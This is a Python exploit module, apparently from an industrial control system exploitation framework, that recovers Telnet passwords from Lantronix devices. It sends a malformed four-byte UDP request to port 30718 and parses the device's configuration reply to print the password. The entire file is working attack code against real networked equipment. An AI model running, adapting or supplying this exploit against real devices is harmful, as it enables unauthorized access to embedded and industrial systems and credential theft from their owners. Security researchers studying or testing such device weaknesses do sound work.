#!/usr/bin/env python
# coding=utf-8
import socket
import time
from core.exploit import *


class MyScript(BaseExploit):
    register_info = {
        'ID': 'ICF-2017-0F120601',
        'Name': 'Lantronix Telnet 密码恢复',
        'Author': 'w3h',
        'License': ISF_LICENSE,
        'Create_Date': '2017-12-06',
        'Description': '''通过在端口30718上发送一个格式错误的请求检索 Lantronix 设备配置，可以获取Telnet密码。''',

        'Vendor': VENDOR.LX,
        'Device': [],
        'App': '',
        'Protocol': 'udp',
        'References': {'CVE': '', 'CNVD': '', 'OSVDB': '', 'CNNVD': ''},

        'Risk': RISK.H,  # H/M/L
        'VulType': VULTYPE.REP
    }

    register_options = [
        mkopt_rport(30718),
    ]

    def exploit(self, *args, **kwargs):
        host = self.TargetIp
        port = int(self.TargetPort)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = '\x00\x00\x00\xF8'
        s.connect((host, port))
        s.sendall(data)
        buf = s.recv(2048)
        if len(buf) < 20:
            return

        if buf[3] and ord(buf[3]) == 0xF9:
            if ord(buf[12]) < 32 or ord(buf[12]) > 127:
                print("Password secured")
                return
            if ord(buf[13]) < 32 or ord(buf[13]) > 127:
                print("Password secured")
                return
            if ord(buf[14]) < 32 or ord(buf[14]) > 127:
                print("Password secured")
                return
            if ord(buf[15]) < 32 or ord(buf[15]) > 127:
                print("Password secured")
                return

            password = buf[12:16]
            print("Password: " + password)
        else:
            print("Password secured")


MainEntry(MyScript, __name__)
